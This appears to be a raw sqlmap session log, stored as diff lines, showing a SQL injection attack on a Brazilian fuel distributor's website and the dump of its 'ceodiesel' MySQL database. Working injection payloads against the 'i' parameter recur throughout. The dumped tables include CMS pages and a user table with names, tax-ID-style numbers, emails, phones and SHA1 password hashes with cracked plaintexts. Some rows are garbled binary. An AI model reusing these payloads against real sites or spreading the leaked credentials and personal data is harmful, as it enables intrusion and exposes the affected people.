++--------------+-------------------------+-------------+--------------+----------------------------+
+| id_aplicacao | str_nome                | ch_situacao | ch_auditoria | str_descricao              |
++--------------+-------------------------+-------------+--------------+----------------------------+
+| 1            | Cadastro de grupos      | A           | CUD          | Cria grupos de usu\xe1rios |
+| 2            | Cadastro de usu\xe1rios | A           | CUD          | Cria os usu\xe1rios        |
++--------------+-------------------------+-------------+--------------+----------------------------+
+
+Database: ceodiesel
+Table: noticias_dados
+[6 entries]
++-------+---------+-----------------------+------------+----------------------------------------------------------------------------------------------------+---------------+----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id    | id_user | foto                  | data       | texto                                                                                              | titulo        | destaque | subtitulo                                                                                                                                                                                    |
++-------+---------+-----------------------+------------+----------------------------------------------------------------------------------------------------+---------------+----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 12273 | 35      | ContactBackground.jpg | 2014-11-07 | \xa0texto                                                                                          | Noticia 1     | nao      | \xa0Noticia 2                                                                                                                                                                                |
+| 12274 | 35      | h1blog.jpg            | 2014-11-07 | \xa0\xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet | \xa0Noticia 2 | nao      | \xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet\xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet, \xa0Lorem ipsum dolor sit amet |
+| 12280 | 35      | 6.jpg                 | 2014-11-07 | \xa0                                                                                               | \xa0Noticia 5 | sim      | \xa0 Noticia 4                                                                                                                                                                               |
+| 12283 | 35      | blog3.jpg             | 2014-11-07 | titulo 2                                                                                           | titulo 2      | nao      | titulo 2                                                                                                                                                                                     |
+| 12284 | 35      | 4.jpg                 | 2014-11-07 | \xa0texto de exemplo                                                                               | \xa0Titulo 6  | sim      | \xa0subtitulo 6 lorem ipsum                                                                                                                                                                  |
+| 12285 | 35      | Tulips.jpg            | 2014-11-10 | texto news2                                                                                        | news2         | nao      | sub news2                                                                                                                                                                                    |
++-------+---------+-----------------------+------------+----------------------------------------------------------------------------------------------------+---------------+----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: ceodiesel
+Table: page
+[7 entries]
++----+-----------+-------------+--------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+-------------+
+| id | id_criado | id_alterado | page                                       | content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | dt_criado           | dt_alterado         | ch_situacao |
++----+-----------+-------------+--------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+-------------+
+| 57 | 0         | 100         | empresa                                    | <div id="about" class="about" style="text-align: left;">\n<h2 style="text-align: center;">A CEO DIESEL</h2>\n<center><img src="images/service.png" alt="" /></center><br />\n<p>A CEO DIESEL. \xe9 uma empresa com quase 15 anos de experi\xeancia de mercado, uma empresa quen\xe3o para de investir e crescer no competitivo mercado do combust\xedveis, sem abrir m\xe3o de valores como \xe9tica, transpar\xeancia e honestidade, na qualidade de produtos e servi\xe7os e respeito aos clientes.<br />Sempre garantindo seguran\xe7a e tranquilidade nas transa\xe7\xf5es comerciais, acompanhamos e participamos de todas as mudan\xe7as nas legisla\xe7\xf5es que afetam o neg\xf3cio, atentos aos riscos fiscais e tribut\xe1rios.</p>\n<p>A CEO DIESEL tem uma equipe de profissionais do segmento, altamente qualificada e capacitada para realizar \xf3timos neg\xf3cios, que atua de forma respons\xe1vel, \xe9tica e transparente, buscando agregar valor aos seus clientes.</p>\n<p>A CEO DIESEL conquistou o reconhecimento de seus clientes e parceiros se especializando e conquistando vantagens competitivas em todas as etapas dos processos que envolvem o agenciamento do combustivel. Seus diferenciais est\xe3o no investimento cont\xednuo em gest\xe3o de neg\xf3cios, profissionaliza\xe7\xe3o de sua equipe e otimiza\xe7\xe3o de seus recursos.</p>\n<p><br />As Vantagens diferenciadas da CEO DIESEL:</p>\n<p>\xa0• Conquistar clientes e manter uma parceria efetiva, gerando fidelidade;<br />• Investir esfor\xe7os em atividades p\xf3s-venda, conquistando o cliente e mantendo sua fidelidade;<br />• Marca reconhecida e respeitada no mercado;<br />• Muita experi\xeancia no mercado de combust\xedveis;<br />• Caminh\xf5es pr\xf3prios monitorados 24h;<br />• Ve\xedculos novos e revisados periodicamente;<br />• Motoristas treinados regularmente;<br />• Central de Servi\xe7os moderna;<br />• Comprometimento em atender aos requisitos legais relacionados ao meio ambiente, seguran\xe7a e medicina do trabalho aplic\xe1veis \xe0s nossas atividades;<br />• An\xe1lise e monitoramento dos aspectos e impactos ambientais, de seguran\xe7a e sa\xfade no trabalho, reduzindo riscos;<br />• Preven\xe7\xe3o da polui\xe7\xe3o;<br />• Compromisso com a responsabilidade social empresarial, demonstrado em nosso c\xf3digo de \xe9tica e com a melhoria continua de nosso desempenho em qualidade, meio ambiente, seguran\xe7a e sa\xfade no trabalho.</p>\n<p>\xa0</p>\n</div>                                                                                                                                                                                                                                                                                            | 0000-00-00 00:00:00 | 2017-04-13 11:37:40 | A           |
+| 58 | 0         | 100         | Álcool                                     | <div id="about" class="about">\n<h2>TRR MARANGONI</h2>\n<img src="images/service.png" alt="" />\n<div class="about-grids">\n<div class="col-md-11 middle">\n<p>TRR MARANGONI/CEODIESEL (Transportador, Revendedor, Retalhista de \xd3leo Diesel e Combust\xedveis) est\xe1 situada no interior do estado de S\xe3o Paulo, com base de distribui\xe7\xe3o pr\xf3pria e moderna, funcion\xe1rios eficazes e altamente capacitados e frota pr\xf3pria.</p>\n<p>Temos como diretriz o foco em um atendimento diferenciado,\xa0 buscando atender exig\xeancias e particularidades dos nossos clientes para que a rela\xe7\xe3o comercial seja sempre bem executada e precisa.</p>\n</div>\n</div>\n</div>\n<p>\xa0</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | 0000-00-00 00:00:00 | 2017-04-13 11:40:52 | I           |
+| 59 | 0         | 1           | Corretores                                 | <div id="services" class="services">\r\n<h2>CORRETORES</h2>\r\n<img src="images/service.png" alt="" />\r\n<p>Veja abaixo nossos corretores.</p>\r\n<div class="container">\r\n<div class="service-grids">\r\n<div class="col-md-3 service-grid"><span class="icon1"> \t\t\t\t\t  \t<img src="/userfiles/image/img-gizeli.jpg" width="200" height="200" alt="" /> \t\t\t\t\t  </span>\r\n<h4>GIZELI ANJOS</h4>\r\n</div>\r\n<div class="col-md-3 service-grid"><span class="icon1"> \t\t\t\t\t  \t<img src="/userfiles/image/img-luiz.jpg" width="200" height="200" alt="" /> \t\t\t\t\t  </span>\r\n<h4>LUIS EDUARDO BACARIN</h4>\r\n</div>\r\n<div class="col-md-3 service-grid"><span class="icon1"> \t\t\t\t\t  \t<img src="/userfiles/image/img-ronaldo.jpg" width="200" height="200" alt="" /> \t\t\t\t\t  </span>\r\n<h4>RONALDO BARBOSA DE MEDEIROS</h4>\r\n</div>\r\n<div class="col-md-3 service-grid"><span class="icon1"> \t\t\t\t\t  \t<img src="/userfiles/image/img-joao.jpg" width="200" height="200" alt="" /> \t\t\t\t  </span>\r\n<h4>JO\xc3O CARLOS DA SILVA</h4>\r\n</div>\r\n<div class="clearfix">\xa0</div>\r\n</div>\r\n</div>\r\n</div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | 0000-00-00 00:00:00 | 2017-03-29 10:26:53 | I           |
+| 60 | 0         | 0           | Previsão do tempo                          | <div class="molly">\r\n<h3>PREVIS\xc3O DO TEMPO</h3>\r\n<p><i>Confira a previs\xe3o do tempo</i></p>\r\n<div class="clearfix">\xa0</div>\r\n<section id="dg-container" class="dg-container">\r\n<div class="dg-wrapper"><iframe src="http://www.tempoagora.com.br/selos_iframe/wide_Campinas-SP,Paulinia-SP,SaoPaulo-SP.html" height="200" width="300" frameborder="0" allowtransparency="yes" scrolling="no"></iframe></div>\r\n</section></div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 | A           |
+| 61 | 0         | 1           | Transportadora - Transporte de combustível | <div class="about">\n<h2>TRANSPORTE DE COMBUST\xcdVEL</h2>\n<img src="images/service.png" alt="" /></div>\n<div style="box-sizing: border-box; color: rgb(99, 121, 136); font-family: 'Open Sans', sans-serif; line-height: 22px; text-align: justify;">A Ceo Diesel \xe9 um TRR (Transportador, Revendedor, Retalhista de \xd3leo Diesel e Combust\xedveis) no interior do estado de S\xe3o Paulo, com uma base de distribui\xe7\xe3o moderna,\xa0com funcion\xe1rios eficazes e capacitados e com frota pr\xf3pria para entregas fracionadas de\xa0diesel, com caminh\xf5es aferidos, tendo todo controle de abastecimento, prezando sempre\xa0por seus clientes, para sempre estar levando para todo o estado de S\xe3o Paulo confian\xe7a e\xa0confiabilidade, e a certeza de sempre estar buscando o melhor para atender seus clientes.<br style="box-sizing: border-box;" />\nAdotando esta diretriz como base para o relacionamento em todas as atividades da empresa e\xa0focando nossos esfor\xe7os em prestar servi\xe7os diferenciados, baseados em um bom\xa0relacionamento e em um atendimento de venda e p\xf3s-venda eficiente, com a manuten\xe7\xe3o de\xa0um Sistema de Gest\xe3o Integrada estruturado sob os seguintes princ\xedpios:</div>\n<div style="box-sizing: border-box; color: rgb(99, 121, 136); font-family: 'Open Sans', sans-serif; line-height: 22px; text-align: justify;">\xa0</div>\n<ul style="box-sizing: border-box; margin-top: 0px; margin-bottom: 10px; color: rgb(99, 121, 136); font-family: 'Open Sans', sans-serif; line-height: 22px; text-align: justify;">\n    <li style="box-sizing: border-box;">\xa0Conquistar clientes e manter uma parceria efetiva, gerando fidelidade;</li>\n    <li style="box-sizing: border-box;">\xa0Divis\xe3o adequada das responsabilidades e dos resultados, gerando satisfa\xe7\xe3o e\xa0participa\xe7\xe3o de nossos colaboradores,\xa0investindo sempre em sua qualifica\xe7\xe3o;</li>\n    <li style="box-sizing: border-box;">\xa0Comprometimento em atender aos requisitos legais relacionados ao meio ambiente,\xa0seguran\xe7a e medicina do trabalho aplic\xe1veis \xe0s nossas atividades;</li>\n    <li style="box-sizing: border-box;">\xa0An\xe1lise e monitoramento dos aspectos e impactos ambientais, de seguran\xe7a e sa\xfade\xa0no trabalho, reduzindo riscos;</li>\n    <li style="box-sizing: border-box;">\xa0Preven\xe7\xe3o da polui\xe7\xe3o;</li>\n    <li style="box-sizing: border-box;">Compromisso com a responsabilidade social empresarial, demonstrado em nosso\xa0c\xf3digo de \xe9tica e com a melhoria continua de nosso desempenho em qualidade, meio\xa0ambiente, seguran\xe7a e sa\xfade no trabalho.\xa0</li>\n</ul>\n<p><img src="/userfiles/image/ceo.jpg" width="685" height="768" alt="" /></p> | 0000-00-00 00:00:00 | 2017-03-28 22:33:00 | I           |
+| 63 | 0         | 100         | produtos                                   | <div id="about" class="about">\n<h2>PRODUTOS</h2>\n<img src="images/service.png" alt="" />\n<div class="about-grids">\n<div class="col-md-11 middle">\n<p>\xa0</p>\n<p>Diesel S-10 e S-500<br /> O diesel \xe9 um combust\xedvel obtido a partir da destila\xe7\xe3o do petr\xf3leo, mais viscoso que a gasolina e com compostos presentes como o enxofre e o nitrog\xeanio. Tem algumas especifica\xe7\xf5es que o separam por tipo e regi\xe3o para comercializa\xe7\xe3o. \xc9 o caso do \xf3leo diesel B S10 com menor teor de enxofre e o \xf3leo diesel B S500 com maior teor de enxofre. Ambos para utiliza\xe7\xe3o em postos de combust\xedveis t\xeam em suas composi\xe7\xf5es adi\xe7\xe3o de 7% de biodiesel.</p>\n</div>\n</div>\n</div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | 0000-00-00 00:00:00 | 2017-04-13 11:41:15 | A           |
+| 64 | 0         | 1           | Serviços                                   | <div id="about" class="about">\r\n<h2>SERVI\xc7OS</h2>\r\n<img src="images/service.png" alt="" />\r\n<div class="about-grids">\r\n<div class="col-md-11 middle">\r\n<h6 style="margin:0 3%">\r\n<p><br />\r\nA CEO TRANSPORTES oferece servi\xe7os de qualidade.</p>\r\n<p>A variedade e qualidade de nossos equipamentos permitem-nos oferecer solu\xe7\xf5es customizadas, como entregas fracionadas desenvolvidas para as necessidades espec\xedficas de cada cliente, e com caminh\xf5es com bombas aferidas, tendo total controle do abastecimento.</p>\r\n<p>Rastreabilidade</p>\r\n<p>A CEO TRANSPORTES conta com rastreadores Sascar em todos os ve\xedculos de sua frota, oferecendo gerenciamento e seguran\xe7a dos servi\xe7os oferecidos aos seus clientes. Todas as cargas transportadas s\xe3o integralmente cobertas por seguro. Alem de trabalhar estritamente dentro das normas que regem o transporte rodovi\xe1rio de produtos de cargas perigosas. <br />\r\nEquipe</p>\r\n<p>Nossa equipe de funcion\xe1rios e motoristas s\xe3o altamente capacitados e treinados para o exerc\xedcio de suas fun\xe7\xf5es de acordo com as r\xedgidas normas da Legisla\xe7\xe3o em vigor. O processo de treinamento inclui, dentre outros os seguintes cursos:</p>\r\n<p>\xa0</p>\r\n<p>CONDUTOR DE VE\xcdCULOS DE TRANSPORTE DE PRODUTOS PERIGOSOS<br />\r\n(MOPP - MOVIMENTA\xc7\xc3O DE PRODUTOS PERIGOSOS)</p>\r\n<p>1 - Dire\xe7\xe3o defensiva e primeiros socorros<br />\r\n2 - Elementos da Legisla\xe7\xe3o<br />\r\n3 - Preven\xe7\xe3o de inc\xeandios<br />\r\n4 - Cargas Perigosas<br />\r\n5 - Meio Ambiente e Cidadania<br />\r\n6 - Treinamento em carregamento e descarga em diversas Cia. como: <br />\r\n<br />\r\nIpiranga <br />\r\nPetrobr\xe1s <br />\r\nShell</p>\r\n<p>\xa0</p>\r\n</h6>\r\n</div>\r\n</div>\r\n</div>\r\n<p>\xa0</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | 0000-00-00 00:00:00 | 2017-03-28 22:32:29 | I           |
++----+-----------+-------------+--------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+-------------+
+
+Database: ceodiesel
+Table: patc_lesoes
+[3 entries]
++----------+-----------+-----------+---------------+----------+----------------------------------------------------------+----------------------------------------------+-------------+
+| id_lesao | id_update | id_create | id_tipo_lesao | str_nome | dt_update                                                | dt_create                                    | ch_situacao |
++----------+-----------+-----------+---------------+----------+----------------------------------------------------------+----------------------------------------------+-------------+
+|         | <blank>   | <blank>   | <blank>       | A        | <blank>                                                  | A                                            | CA          |
+| <blank>  | <blank>   | <blank>   | <blank>       | <blank>  | ??A?????\tAC????\t??C?y??A?????????????A??!?? | ?	??????	???	????????HqaaA????? | !           |
+| <blank>  | <blank>   | <blank>   | <blank>       | <blank>  | <blank>                                                  | <blank>                                      | ???A        |
++----------+-----------+-----------+---------------+----------+----------------------------------------------------------+----------------------------------------------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=pg&i=57 AND 7755=7755
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pg=pg&i=57 AND (SELECT 6036 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(6036=6036,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pg=pg&i=57 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x704a62724b7975726d5a496c756a6e59687169734b4a71657863637a4e416d6d4d696b6777726a42,0x717a6a6b71),NULL,NULL,NULL,NULL,NULL-- dcBi
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: ceodiesel
+[22 tables]
++----------------------------+
+| administrador              |
+| cepestados                 |
+| ci_usuarios                |
+| cmsaplicacoes              |
+| noticias_dados             |
+| page                       |
+| patc_lesoes                |
+| patc_localicazacoes        |
+| patc_pacientes             |
+| patc_parentescos           |
+| patc_raca                  |
+| patc_radiografias          |
+| patc_tipo_lesoes           |
+| pats_aplicacoes            |
+| pats_estados               |
+| pats_filiais               |
+| pats_filiaiscomplementares |
+| pats_grupos                |
+| pats_perfis                |
+| pats_permissoes            |
+| pats_usuarios              |
+| servicos                   |
++----------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=pg&i=57 AND 7755=7755
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pg=pg&i=57 AND (SELECT 6036 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(6036=6036,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pg=pg&i=57 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x704a62724b7975726d5a496c756a6e59687169734b4a71657863637a4e416d6d4d696b6777726a42,0x717a6a6b71),NULL,NULL,NULL,NULL,NULL-- dcBi
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: ceodiesel
+Table: patc_pacientes
+[0 entries]
++---------+-----------+-----------+-----------+------------+-------------+-----------------+--------+---------+---------+---------+---------+----------+----------+-----------+-----------+-----------+-----------+------------+------------+------------+------------+-------------+-------------+--------------+---------------+----------------+-----------------+-----------------+
+| id_raca | id_r_raca | id_update | id_create | str_cidade | id_paciente | id_r_parentesco | str_uf | str_cep | str_cpf | txt_obs | str_sus | str_sexo | str_nome | str_r_cpf | dt_update | str_email | dt_create | str_numero | str_bairro | str_r_nome | str_r_sexo | ch_situacao | str_celular | str_telefone | dt_nascimento | str_logradouro | dt_r_nascimento | str_complemento |
++---------+-----------+-----------+-----------+------------+-------------+-----------------+--------+---------+---------+---------+---------+----------+----------+-----------+-----------+-----------+-----------+------------+------------+------------+------------+-------------+-------------+--------------+---------------+----------------+-----------------+-----------------+
++---------+-----------+-----------+-----------+------------+-------------+-----------------+--------+---------+---------+---------+---------+----------+----------+-----------+-----------+-----------+-----------+------------+------------+------------+------------+-------------+-------------+--------------+---------------+----------------+-----------------+-----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=pg&i=57 AND 7755=7755
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pg=pg&i=57 AND (SELECT 6036 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(6036=6036,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pg=pg&i=57 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x704a62724b7975726d5a496c756a6e59687169734b4a71657863637a4e416d6d4d696b6777726a42,0x717a6a6b71),NULL,NULL,NULL,NULL,NULL-- dcBi
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: ceodiesel
+[22 tables]
++----------------------------+
+| administrador              |
+| cepestados                 |
+| ci_usuarios                |
+| cmsaplicacoes              |
+| noticias_dados             |
+| page                       |
+| patc_lesoes                |
+| patc_localicazacoes        |
+| patc_pacientes             |
+| patc_parentescos           |
+| patc_raca                  |
+| patc_radiografias          |
+| patc_tipo_lesoes           |
+| pats_aplicacoes            |
+| pats_estados               |
+| pats_filiais               |
+| pats_filiaiscomplementares |
+| pats_grupos                |
+| pats_perfis                |
+| pats_permissoes            |
+| pats_usuarios              |
+| servicos                   |
++----------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=pg&i=57 AND 7755=7755
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pg=pg&i=57 AND (SELECT 6036 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(6036=6036,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pg=pg&i=57 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x704a62724b7975726d5a496c756a6e59687169734b4a71657863637a4e416d6d4d696b6777726a42,0x717a6a6b71),NULL,NULL,NULL,NULL,NULL-- dcBi
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: ceodiesel
+Table: pats_usuarios
+[3 entries]
++-----------+------------+------------+-------------+-------------+---------+--------+------------+---------+----------------+----------+----------+-------------------+----------------------------------------------------+--------------------+------------+------------+-------------+-------------+---------------------+-----------------+---------------------+----------------+----------------+-----------------+------------------+
+| id_filial | id_usuario | str_cidade | id_cadastro | id_alterado | origin  | str_uf | str_cep    | ch_tipo | str_cpf        | str_hash | str_foto | str_nome          | str_senha                                          | str_email          | str_numero | str_bairro | str_usuario | ch_situacao | dt_cadastro         | str_celular     | dt_alterado         | str_telefone   | str_logradouro | str_complemento | txt_introduction |
++-----------+------------+------------+-------------+-------------+---------+--------+------------+---------+----------------+----------+----------+-------------------+----------------------------------------------------+--------------------+------------+------------+-------------+-------------+---------------------+-----------------+---------------------+----------------+----------------+-----------------+------------------+
+| 1         | 101        | <blank>    | 100         | 100         | <blank> | Se     | <blank>    | I       | 555.555.555-55 | NULL     | <blank>  | allison rodrigues | 25be6894160644c9ed323968bb6cc1fbd004a4c6 (allison) | allison1@gmail.com | <blank>    | <blank>    | allison     | A           | 2017-04-10 14:33:45 | (33) 33333-3333 | 2017-04-10 18:36:28 | (22) 2222-2222 | <blank>        | <blank>         | <blank>          |
+| 1         | 100        | paulinia   | 1           | NULL        | <blank> | SP     | 00.000-000 | I       | 123.456.789-01 | NULL     | <blank>  | administrador     | d033e22ae348aeb5660fc2140aec35850c4da997 (admin)   | admin@admin.com    | 1          | centro     | admin       | A           | 2017-04-10 14:27:57 | (00) 00000-0000 | NULL                | (11) 1111-1111 | rua 1          | <blank>         | NULL             |
+| 1         | 101        | <blank>    | 100         | 100         | <blank> | Se     | <blank>    | I       | 555.555.555-55 | NULL     | <blank>  | allison rodrigues | 25be6894160644c9ed323968bb6cc1fbd004a4c6 (allison) | allison1@gmail.com | <blank>    | <blank>    | allison     | A           | 2017-04-10 14:33:45 | (33) 33333-3333 | 2017-04-10 18:36:28 | (22) 2222-2222 | <blank>        | <blank>         | NULL             |
++-----------+------------+------------+-------------+-------------+---------+--------+------------+---------+----------------+----------+----------+-------------------+----------------------------------------------------+--------------------+------------+------------+-------------+-------------+---------------------+-----------------+---------------------+----------------+----------------+-----------------+------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: i (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pg=pg&i=57 AND 7755=7755
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pg=pg&i=57 AND (SELECT 6036 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(6036=6036,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: pg=pg&i=57 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x704a62724b7975726d5a496c756a6e59687169734b4a71657863637a4e416d6d4d696b6777726a42,0x717a6a6b71),NULL,NULL,NULL,NULL,NULL-- dcBi
